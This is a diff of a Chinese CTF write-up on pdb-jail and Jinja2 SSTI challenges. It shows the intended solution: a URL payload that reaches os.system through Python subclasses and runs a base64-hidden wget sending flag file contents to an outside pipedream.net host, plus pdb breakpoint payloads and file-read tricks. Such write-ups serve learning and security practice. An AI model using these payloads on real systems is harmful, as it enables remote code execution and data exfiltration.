@@ -80,9 +80,7 @@ payload = "breakpoint(commands=['n','n','j 4','n','j 15','c'])"
 print(payload)
 ```
 
-:::info
-有看到許多非預期解，大致都是透過 `p *open(flag)` 去讀檔拿 flag
-:::
+有看到許多非預期解，大致都是用會影響 frame count 的語法，然後透過 `p *open(flag)` 去讀檔拿 flag
 
 
 ## Breakjail Online 🛜 
@@ -95,7 +93,7 @@ TL;DR;
 3. 在 pdb 環境下 RCE
 
 
-關鍵程式碼如下，使用者可以控制 q，並且跟前一題類似，有 `.` `_` `|` 的黑名單，以及字數 88 的上限，之後頭尾加上 `{{` `}}` 後，就會拿去 render_template_string
+關鍵程式碼如下，使用者可以控制 q，並且跟前一題類似，有 `.` `_` `|` 的黑名單，所以 Jinja2 SSTI 常見的招都不太能用了，以及字數 88 的上限，之後頭尾加上 `{{` `}}` 後，就會拿去 render_template_string
 
 將 request 的一系列參數都清空的，但觀察一下會發現 `query_string` 仍然是我們可以控制的部分
 ```python
@@ -125,7 +123,7 @@ def showip():
 
 ```
 
-這題的預期解是:
+這題的預期解是：
 
 ```
  http://localhost:10003/SsTiMe?''.__class__.__base__.__subclasses__().__getitem__(123).load_module('os').system('echo'+chr(32)+'d2dldCBodHRwczovL2VveTgzd2ZtN2g2Ym9kYi5tLnBpcGVkcmVhbS5uZXQ/YT1gY2F0IC9mbGFnXypg'+chr(124)+'base64'+chr(32)+'-d'+chr(124)+'bash')&q=breakpoint(commands=%5Bstr(request%5B'query%5Cx5fstring'%5D)%5B3:229%5D%5D) 
@@ -171,11 +169,11 @@ print(r.text)
 ```
 
 
-這題由於沒注意到 breakpoint commands 的環境 `__builtins__` 跟 `__import__` 都活得好好的，因此存在直接 import os 來 RCE，搭配把 payload 慢慢存到本地來壓 payload 長度的非預期解。
+這題由於沒注意到 breakpoint commands 的環境 `__builtins__` 跟 `__import__` 都活得好好的，因此存在直接 import os 來 RCE，搭配把 payload 慢慢存到本地來壓 q 長度的非預期解。
 
 
-看到 @nella17 提到可以透過 format string 將 bytes 轉 str:
+看到 @nella17 提到可以透過 format string 將 bytes 轉 str：
 `a=b'c'; f'{c}'`
 
-在 Discord 看到 @dalun 直接用 `request[a:b]` 來進一步縮減 payload 長度：
+在 Discord 看到 @dalun 直接用 `request[a:b]` 來進一步縮減 payload 長度，類似：
 `breakpoint(commands=[f'{{request}}'[40:-54]])`
